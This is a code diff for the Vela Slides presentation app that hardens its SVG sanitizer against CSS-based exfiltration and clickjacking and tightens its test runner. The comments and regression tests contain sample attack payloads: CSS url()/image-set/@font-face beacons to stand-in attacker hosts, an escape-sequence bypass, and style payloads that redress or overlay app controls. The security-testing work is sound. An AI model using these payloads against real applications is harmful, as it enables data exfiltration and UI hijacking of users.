@@ -135,8 +135,13 @@ const velaClipboardReadSlides = async () => {
   return [];
 };
 
-const VELA_VERSION = "13.31";
+const VELA_VERSION = "13.36";
 const VELA_CHANGELOG = [
+  { v: "13.36", d: ["CI hardening: the SVG-<style> recurrence guard now scans every part-file (not a hardcoded list that had drifted), forbids built-in prototype tampering that the sanitizer's tag lookup relies on, requires the redress/overlay tests to keep their real assertions, and fails (never skips) if the sanitizer source can't be located. Added a PART_ORDER-completeness guard.", "Housekeeping: added the missing license header to the PPTX export part-file."] },
+  { v: "13.35", d: ["Security (High): the SVG inline style filter now also rejects CSS layout/positioning (position/inset/z-index/pointer-events/viewport-sizing), closing a UI-integrity gap where a positioned SVG element could overlay or clickjack app chrome from a non-clipped diagram panel — the same redress/clickjack class, via the inline-style path rather than the <style> element. SVG paint styling is unaffected.", "CI hardening: security sanitizer regression tests are now un-skippable at runtime (a skip is failed), and the allowlist-tamper guard also catches aliased membership overrides — closing seams where a regression could reach green CI."] },
+  { v: "13.34", d: ["CI hardening: the SVG-<style> exclusion lint now also rejects runtime tampering with the tag allowlist (membership-method override / reassignment), and requires the real-runtime redress regression test to always run (security UI tests can't be marked skippable) — closing two seams where the element could be re-admitted with green CI.", "Test fix: the student-mode teacher-panel tests now navigate to a notes-free slide instead of being AI-gated, restoring real coverage of the panel shell."] },
+  { v: "13.33", d: ["Test integrity: the in-app UI battery now fails a test whose assertion returns false — previously only a thrown error failed a test, so return-based checks (incl. the SVG-<style> redress regression) never failed. Corrected 5 pre-existing tests this surfaced (4 AI-gated, 1 stale selector).", "CI: hardened the SVG-<style> exclusion lint to verify runtime semantics — it now rejects dynamic or escaped allowlist constructions that could re-admit the element past a byte-level check."] },
+  { v: "13.32", d: ["Security (High): the deck SVG sanitizer no longer allows a `<style>` element, closing a UI-integrity gap where document-global CSS could restyle/relocate/re-label the app's own controls (a redress class, escalatable to clickjacking a one-click action). Deck paint uses element-local presentation attributes instead.", "Added a new UI-integrity threat-model invariant, a browser regression test proving deck SVG cannot affect app chrome, and a lint guard preventing re-introduction."] },
   { v: "13.31", d: "Security (defense-in-depth): unified table-cell Markdown escaping into one complete pass (backslash escaped alongside pipe), resolving a static-analysis incomplete-escaping finding; no behavior change." },
   { v: "13.30", d: ["Security (defense-in-depth): adversarial review hardened the 13.29 fixes to rock-solid. The dev-server deck listing now refuses to follow a symlinked entry at open time, closing a check/use race rather than relying on a prior path check. Markdown export now applies complete Markdown-context output encoding to every deck-text field at the sink — link/image destinations, reference-style syntax, raw HTML and autolinks, code fences and tables — with matching HTML-stripping of the contributing text fields at import.", "Extensive regression tests added."] },
   { v: "13.29", d: ["Security (Medium, defense-in-depth): the local dev-server deck listing now enforces the same folder-containment check as every other file endpoint, closing a symlink-escape information disclosure.", "Security (Medium): the local AI channel now requires an authentication token unconditionally and no longer treats a request's Origin as an access boundary, closing an opaque-origin cross-origin access class.", "Security (Low, defense-in-depth): Markdown export now routes deck text through the shared URL-scheme allowlist and Markdown-context output encoding, reaching parity with the live renderer and closing a link/image injection class.", "Regression tests added across all three."] },
@@ -560,7 +565,16 @@ const SVG_ALLOWED_TAGS = new Set([
   // common-but-needs-care (each has explicit attribute filtering downstream)
   "a",      // href passes scheme allowlist
   "image",  // href/xlink:href pass scheme allowlist
-  "style",  // textContent passes isSvgStyleSafe; walk descends to strip CDATA/comment/PI
+  // SECURITY: <style> is deliberately NOT allowed. An inline <style> injected via
+  // dangerouslySetInnerHTML applies DOCUMENT-GLOBAL CSS (the cascade is not scoped
+  // to the SVG subtree), so deck-supplied selectors + declarations could restyle,
+  // hide, relocate, or re-label the trusted application UI — i.e. redress and
+  // clickjack real controls. A deck value must never alter the presentation,
+  // geometry, hit-testing, or labeling of app chrome (UI-integrity invariant).
+  // Legitimate deck paint needs only presentation attributes (fill="url(#id)",
+  // gradients, markers), which remain allowed and validated. isSvgStyleSafe (below)
+  // is retained for the inline style="" attribute and url-ref presentation
+  // attributes, whose reach is element-local, not cascade-global.
 ]);
 
 // SVG attributes whose value can carry a functional URL reference that the
@@ -574,13 +588,16 @@ const SVG_URL_REF_ATTRS = new Set([
   "marker", "marker-start", "marker-mid", "marker-end", "cursor", "color-profile",
 ]);
 
-// SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
-// attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
-// render — zero-click exfil beacon with no CSP backstop inside the artifact
-// srcdoc. SAFE_STYLE_KEYS only filters the style="..." inline attribute, not
-// <style>-element CSS text. We allow url(#fragment) (SVG paint servers,
-// markers, gradients, clip-paths) and reject everything else that can hit
-// the network or use legacy code-execution constructs. CSS \XX escape
+// SVG CSS-value filter for the inline style="" attribute and url-ref
+// presentation attributes (fill/stroke/filter/mask/clip-path/marker/cursor).
+// The <style> ELEMENT is no longer allowed (see SVG_ALLOWED_TAGS) — a
+// document-global stylesheet is dropped outright, not filtered — so this guards
+// only element-local CSS values. The threat here: a value like
+// background:url("https://attacker/?d=...") or image-set("https://…") fires an
+// outbound GET on render — a zero-click exfil beacon with no CSP backstop inside
+// the artifact srcdoc. We allow url(#fragment) (SVG paint servers, markers,
+// gradients, clip-paths) and reject everything else that can hit the network or
+// use legacy code-execution constructs. CSS \XX escape
 // sequences can decode "url" / "@import" past a literal-token regex
 // (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
 // Also reject any '<' or ']]>' — defense-in-depth against rawtext-breakout
@@ -627,6 +644,18 @@ function isSvgStyleSafe(css) {
   // image-set() bypass of the v12.53 url() exfil fix.
   const fnStr = css.match(/[a-z][\w-]*\s*\(\s*['"]/gi);
   if (fnStr && fnStr.some((m) => !/^url\s*\(/i.test(m))) return false;
+  // UI-integrity: reject CSS layout/positioning properties. SVG paint via inline
+  // style is fine (fill/stroke/opacity/stroke-width/…), but position/inset/z-index/
+  // pointer-events let a deck element ESCAPE its container and overlay, hide, or
+  // clickjack the trusted app UI — the render sinks in the study-notes / teacher
+  // diagram panels are NOT inside a transform+overflow-hidden containing block, so a
+  // fixed-positioned SVG element reaches whole-app chrome. This mirrors the exclusion
+  // SAFE_STYLE_KEYS already enforces for block.style; the SVG inline-style path (and
+  // the presentation-attr values that share this filter) must consult the same bar.
+  if (/(?:^|[;{}\s])(?:position|top|left|right|bottom|inset(?:-block|-inline)?(?:-start|-end)?|z-index|pointer-events)\s*:/i.test(css)) return false;
+  // Viewport-relative sizing is itself an overlay primitive (a 100vw×100vh element);
+  // legit SVG paint never needs it.
+  if (/\b[\d.]+(?:vw|vh|vmin|vmax|vi|vb|dvw|dvh|dvi|dvb|svw|svh|lvw|lvh|cqw|cqh|cqi|cqb)\b/i.test(css)) return false;
   return true;
 }
 
@@ -677,21 +706,11 @@ function sanitizeSvgMarkup(raw) {
           // differently at the HTML dangerouslySetInnerHTML sink. Drop anything
           // outside the SVG namespace. Mirrors DOMPurify's _checkValidNamespace.
           if (child.namespaceURI !== "http://www.w3.org/2000/svg") { child.remove(); continue; }
-          if (tag === "style") {
-            if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
-            // SECURITY: strip EVERY attribute from <style> — do NOT skip the
-            // attribute pass. <style> is a common SVG/HTML element, so on the
-            // dangerouslySetInnerHTML HTML re-parse any surviving handler goes
-            // live (mutation-XSS). Legitimate SVG <style> needs no attribute we
-            // keep (type/media are inert and optional), so drop them all
-            // uniformly rather than trusting an element-specific shortcut. (v13.19)
-            for (const a of Array.from(child.attributes)) child.removeAttribute(a.name);
-            // Still descend so the nodeType filter above strips any CDATA/comment/PI
-            // children. CDATA serializes literally and a smuggled `</style>` inside
-            // it escapes rawtext when re-parsed as HTML, yielding a live handler.
-            walk(child);
-            continue;
-          }
+          // <style> is not in SVG_ALLOWED_TAGS (removed at the allowlist check
+          // above) — an inline stylesheet is document-global, not SVG-scoped, so
+          // it is dropped outright rather than filtered. isSvgStyleSafe still runs
+          // on the inline style="" attribute and url-ref attrs (element-local reach)
+          // in the attribute pass below.
           const attrs = Array.from(child.attributes);
           for (const a of attrs) {
             const name = a.name.toLowerCase();
@@ -10093,6 +10112,21 @@ async function runUITests(onProgress) {
       // Tests flagged requiresAI degrade to a visible skip (not a failure) when
       // Vera AI is unavailable (offline/keyless) — see CR-02.
       if (test.requiresAI && typeof velaAIAvailable === "function" && !velaAIAvailable()) {
+        // Security regression tests (SVG sanitizer / redress / clickjack) must NEVER
+        // skip. CI treats a skip as non-failing, so allowing requiresAI on them would
+        // let a re-admitted <style> — or any sanitizer regression — reach green CI by
+        // skipping the real-runtime test that catches it. requiresAI on such a test is
+        // itself the tampering signal, so FAIL instead of skip. This is RUNTIME
+        // enforcement on the actual test object, immune to the source-parse dodges
+        // (comment padding, property order) that a static lint check can be fooled by.
+        const _secPat = /saniti[sz]|xss|security|redress|clickjack|<style>/i;
+        if (_secPat.test(suite.name) || _secPat.test(test.name)) {
+          failed++;
+          allResults.push({ suite: suite.name, name: test.name, pass: false, error: "security test must not be requiresAI-skippable (would let a sanitizer regression pass CI by skipping)", ms: Math.round(performance.now() - t0) });
+          if (onProgress) onProgress({ done, total, suite: suite.name, test: test.name, phase: "done", passed, failed, skipped, results: [...allResults] });
+          await _wait(20);
+          continue;
+        }
         skipped++;
         allResults.push({ suite: suite.name, name: test.name, pass: "skip", error: "AI unavailable — skipped", ms: Math.round(performance.now() - t0) });
         if (onProgress) onProgress({ done, total, suite: suite.name, test: test.name, phase: "done", passed, failed, skipped, results: [...allResults] });
@@ -10100,9 +10134,21 @@ async function runUITests(onProgress) {
         continue;
       }
       try {
-        await test.fn();
-        passed++;
-        allResults.push({ suite: suite.name, name: test.name, pass: true, ms: Math.round(performance.now() - t0) });
+        // A test passes by returning a truthy value OR by assertion-style running
+        // to completion with no explicit return (undefined). A DEFINED-FALSY return
+        // (false/null/0/"") is a real assertion failure. Historically the return
+        // value was discarded — only a throw failed a test — so every `return
+        // boolExpr` test (~a third of the battery, incl. the SVG-<style> redress
+        // regression test) could never fail. Check the result so those assertions
+        // are actually load-bearing.
+        const r = await test.fn();
+        if (r === undefined || !!r) {
+          passed++;
+          allResults.push({ suite: suite.name, name: test.name, pass: true, ms: Math.round(performance.now() - t0) });
+        } else {
+          failed++;
+          allResults.push({ suite: suite.name, name: test.name, pass: false, error: "assertion returned " + JSON.stringify(r), ms: Math.round(performance.now() - t0) });
+        }
       } catch (e) {
         failed++;
         allResults.push({ suite: suite.name, name: test.name, pass: false, error: e?.message || String(e), ms: Math.round(performance.now() - t0) });
@@ -10978,8 +11024,21 @@ uiSuite("Student Mode", [
     if (!btn) throw new Error("student-toggle not found");
     _click(btn);
     await _waitFor(() => _$("[data-teacher-panel]"), 5000);
+    // The demo deck has slides with pre-authored studyNotes; on those the student
+    // panel renders the static StaticStudyPanel (data-study-panel), NOT the live
+    // TeacherPanel. The next tests assert TeacherPanel's shell (which renders
+    // unconditionally, no AI needed), so navigate to a notes-free slide —
+    // TeacherPanel is [data-teacher-panel] WITHOUT data-study-panel. (These 4 tests
+    // were previously mislabeled requiresAI, hiding this suite-ordering dependency.)
+    for (let i = 0; i < 40 && _$("[data-teacher-panel][data-study-panel]"); i++) {
+      _key("ArrowRight"); await _wait(90);
+    }
+    await _waitFor(() => _$("[data-teacher-panel]:not([data-study-panel])"), 2000).catch(() => {});
   }},
   { name: "Teacher panel renders VERA header", fn: async () => {
+    // TeacherPanel renders its VERA header / disclaimer / Ask UI unconditionally
+    // (no AI backend needed). The suite setup navigates to a notes-free slide so
+    // this is TeacherPanel, not StaticStudyPanel — see "Activate student mode".
     const panel = _$("[data-teacher-panel]");
     return !!panel && (panel.textContent || "").includes("VERA");
   }},
@@ -11429,13 +11488,16 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<style>* { background: \\75rl("https://attacker.invalid/") }</style><rect/>');
     return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
   }},
-  { name: "SVG <style> with safe class CSS preserved (Mermaid/Vera compat)", fn: async () => {
+  { name: "SVG <style> element stripped (document-global CSS disallowed; shapes still render)", fn: async () => {
+    // A <style> is document-global (not SVG-scoped) — dropped outright, not filtered.
+    // The shape element survives so geometry still renders; only the class CSS is gone.
     const out = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
-    return /<style/i.test(out) && /#3b82f6/.test(out) && /\.node/.test(out);
+    return !/<style[\s>]/i.test(out) && !/#3b82f6/.test(out) && /<rect[^>]*class="node"/i.test(out);
   }},
-  { name: "SVG <style> with url(#fragment) preserved (paint-server refs)", fn: async () => {
-    const out = sanitizeSvgMarkup('<style>.arrow{fill:url(#grad1);marker-end:url(#mark)}</style><rect class="arrow"/>');
-    return /<style/i.test(out) && /url\(#grad1\)/.test(out) && /url\(#mark\)/.test(out);
+  { name: "SVG url(#fragment) paint refs preserved via presentation attrs (<style> dropped)", fn: async () => {
+    // Paint-server refs belong on presentation attributes, which remain allowed+validated.
+    const out = sanitizeSvgMarkup('<rect fill="url(#grad1)" marker-end="url(#mark)" clip-path="url(#c)"/>');
+    return /fill="url\(#grad1\)"/.test(out) && /marker-end="url\(#mark\)"/.test(out) && /clip-path="url\(#c\)"/.test(out);
   }},
   // v12.59 — string-source CSS image functions (no url() token) auto-fetch on
   // render. image-set/image/cross-fade/src were the residual bypass of the
@@ -11475,9 +11537,50 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<style>@font-face{font-family:x;src:url(https://attacker.invalid/f)}text{font-family:x}</style><text x="1" y="9">A</text>');
     return !/attacker\.invalid/i.test(out) && !/@font-face/i.test(out) && !/<style[\s>]/i.test(out);
   }},
-  { name: "SVG url(#fragment) with whitespace/quotes still preserved (no false reject)", fn: async () => {
-    const out = sanitizeSvgMarkup('<style>.a{fill:url( #grad )}.b{mask:url("#m")}</style><rect class="a" clip-path="url(#c)"/>');
-    return /<style/i.test(out) && /#grad/.test(out) && /url\(#c\)/.test(out);
+  { name: "SVG url(#fragment) whitespace on presentation attr preserved (no false reject)", fn: async () => {
+    // isSvgStyleSafe still guards url-ref presentation attrs; url( #frag ) must not false-reject.
+    const out = sanitizeSvgMarkup('<rect fill="url( #grad )" clip-path="url(#c)"/>');
+    return /#grad/.test(out) && /url\(#c\)/.test(out);
+  }},
+  { name: "SECURITY: deck SVG <style> cannot restyle/relocate app chrome (S16/S17 redress+clickjack)", fn: async () => {
+    // The load-bearing regression test for the UI-integrity family: render a
+    // hostile deck SVG the SAME way the app does (sanitize -> innerHTML) and prove
+    // deck CSS cannot reach a real app control (no restyle, no reposition, no hide).
+    const victim = document.createElement("button");
+    victim.setAttribute("title", "Delete slide (Del)");
+    victim.style.background = "rgb(1, 2, 3)";
+    document.body.appendChild(victim);
+    const host = document.createElement("div");
+    document.body.appendChild(host);
+    try {
+      const payload = '<style>button[title^="Delete slide"]{position:fixed !important;background:rgb(34,197,94) !important;opacity:0 !important}*{color:red !important}</style><rect width="10" height="10"/>';
+      host.innerHTML = sanitizeSvgMarkup(payload);
+      const noStyle = !host.querySelector("style") && !/<style[\s>]/i.test(host.innerHTML);
+      const cs = getComputedStyle(victim);
+      const bg = (cs.backgroundColor || "").replace(/\s/g, "");
+      const unaffected = bg === "rgb(1,2,3)" && cs.position !== "fixed" && cs.opacity === "1";
+      return noStyle && unaffected;
+    } finally { host.remove(); victim.remove(); }
+  }},
+  { name: "SECURITY: deck SVG inline style cannot overlay app chrome (fixed-position clickjack)", fn: async () => {
+    // R4A vector: the <style> ELEMENT was removed, but an inline style="" on an SVG
+    // element carrying position:fixed/inset/z-index/viewport-sizing escapes the
+    // non-clipped study-notes/teacher diagram sinks and overlays whole-app chrome.
+    // Prove the real sanitizer output produces no viewport-covering fixed/absolute element.
+    const host = document.createElement("div");
+    document.body.appendChild(host);
+    try {
+      const payload = '<rect fill="red" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;pointer-events:auto"/><g style="position:fixed;inset:0;z-index:99999"><rect width="50" height="50"/></g>';
+      host.innerHTML = sanitizeSvgMarkup(payload);
+      const overlay = Array.from(host.querySelectorAll("*")).some((el) => {
+        const p = getComputedStyle(el).position;
+        return p === "fixed" || p === "absolute";
+      });
+      const mid = document.elementFromPoint(Math.floor(innerWidth / 2), Math.floor(innerHeight / 2));
+      const covered = !!(mid && host.contains(mid));
+      const clean = !/position\s*:/i.test(host.innerHTML) && !/z-index/i.test(host.innerHTML) && /fill="red"/.test(host.innerHTML);
+      return !overlay && !covered && clean;
+    } finally { host.remove(); }
   }},
   { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
     const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
@@ -11676,13 +11779,14 @@ uiSuite("Gallery View", [
     await _waitFor(() => _$text("G or ESC to close"), 1000);
   }},
   { name: "Click card navigates", fn: async () => {
-    const nums = _$$("span").filter(s => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono"));
-    const card2 = nums.find(n => n.textContent?.trim() === "2");
-    if (card2) {
-      const cardEl = card2.closest("div[style*='cursor: pointer'], div[style*='cursor:pointer']");
-      if (cardEl) _click(cardEl);
-    }
-    await _wait(400);
+    // Click a real gallery card by its stable data-testid (the clickable card div,
+    // part-slides.jsx). Clicking it runs jump() -> SELECT + SET_SLIDE_INDEX + onClose,
+    // so the gallery closes. (Previously this hunted a mono "2" span + a cursor-style
+    // substring, which could match a non-card span and silently no-op.)
+    const cards = _$$("[data-testid='gallery-slide']");
+    if (!cards.length) throw new Error("no gallery-slide cards rendered");
+    _click(cards[0]);
+    await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {});
     return !_$text("GALLERY");
   }},
   { name: "G key toggles gallery off", fn: async () => {
@@ -17587,7 +17691,7 @@ function StandaloneHtmlModal({ state, onClose }) {
 }
 
 
-// ─────────────────────────────────────────────────────────────────────────
+// © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
 // part-pptx.jsx — native, editable PowerPoint (.pptx) exporter
 //
 // A second emitter over the SAME per-slide primitive IR the vector-PDF path
